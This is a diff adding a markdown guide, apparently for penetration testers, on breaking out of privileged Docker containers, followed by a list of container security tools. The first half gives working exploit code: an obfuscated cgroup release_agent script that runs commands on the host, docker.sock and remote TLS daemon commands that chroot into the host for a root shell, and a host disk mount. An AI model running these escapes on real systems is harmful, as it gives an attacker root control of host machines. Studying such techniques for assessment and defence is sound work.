@@ -1,0 +1,94 @@
+# Manual Breakout - Privileged Containers
+
+## Exploiting Privileged Containers
+
+### Shell Script for Running Commands on the Host
+This script runs commands on the underlying host from a privileged container:
+
+```sh
+#!/bin/sh
+d=`dirname $(ls -x /s*/fs/c*/*/r* |head -n1)`
+mkdir -p $d/w;echo 1 >$d/w/notify_on_release
+t=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
+touch /o; echo $t/c >$d/release_agent;echo "#!/bin/sh
+$1 >$t/o" >/c;chmod +x /c;sh -c "echo 0 >$d/w/cgroup.procs";sleep 1;cat /o
+```
+
+Save it as `escape.sh` and execute it with privileged permissions:
+```sh
+./escape.sh ps -ef
+```
+
+### Using the Docker Socket for Breakout
+If the Docker socket is available at `/var/run/docker.sock`, install the Docker CLI tool and execute any Docker command. To break out:
+
+```sh
+docker run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
+```
+
+This command provides root shell access on the host.
+
+### Mounting the Underlying Root Filesystem
+Another method is mounting the host’s root filesystem. Run `mount` to find available filesystems. Typically, files like `/etc/resolv.conf` are mounted from the host, so locate that disk and mount it under `/host` for full access:
+
+```sh
+mount /dev/sdX /host
+```
+
+## Exploiting Docker Daemon with TLS Credentials
+By default, the Docker daemon listens on port `2376` and requires authentication. If you have the required certificates, use the following commands:
+
+```sh
+docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 info
+```
+
+Confirming access allows running privileged containers:
+
+```sh
+docker --tlsverify --tlscacert=ca.pem --tlscert=cert.pem --tlskey=key.pem -H=[IP]:2376 run -ti --privileged --net=host --pid=host --ipc=host --volume /:/host busybox chroot /host
+```
+
+---
+
+## Container Attack Surface Assessment & Breakout Tools
+### Privilege Escalation & Breakout Tools
+- **deepce** - Docker Enumeration, Escalation of Privileges, and Container Escape tool.
+- **CDK** - Container and Kubernetes auditing and breakout tool.
+
+### Container Vulnerability Scanning Tools
+- **Trivy** - Vulnerability and Infrastructure as Code (IaC) scanner.
+- **Grype** - Container vulnerability scanner.
+- **clair** - Container vulnerability scanner.
+- **Docker Scout** - Container vulnerability scanner.
+- **dep-scan** - Vulnerability and misconfiguration scanner.
+- **Neuvector Scanner** - Container vulnerability scanning tool.
+
+### IaC Scanning Tools for Containers
+- **Trivy** - Vulnerability and IaC scanner.
+- **Checkov** - IaC scanner.
+- **KICS** - IaC scanner.
+- **dep-scan** - Vulnerability and misconfiguration scanner.
+
+### Docker Security Tools
+- **docker bench** - Docker CIS Benchmark assessment tool.
+- **Dockle** - Container image linter.
+- **cnspec** - Security assessment tool for Docker and Kubernetes.
+
+### Container Runtime Security Tools
+- **Tracee** - Container runtime security tool.
+- **Falco** - Container runtime security tool.
+- **Kubearmor** - Container runtime security enforcement tool.
+- **Tetragon** - Container runtime security tool.
+
+### Container Registry Tools
+- **regclient** - Tool for interacting with container registries.
+- **crane** - Tool for interacting with container registries.
+- **skopeo** - Tool for interacting with container registries.
+
+### Container Image Tools
+- **Dive** - Tool for exploring container image layers.
+
+---
+This guide provides a structured overview of privileged container exploitation techniques and security tools for assessment and mitigation.
+
+
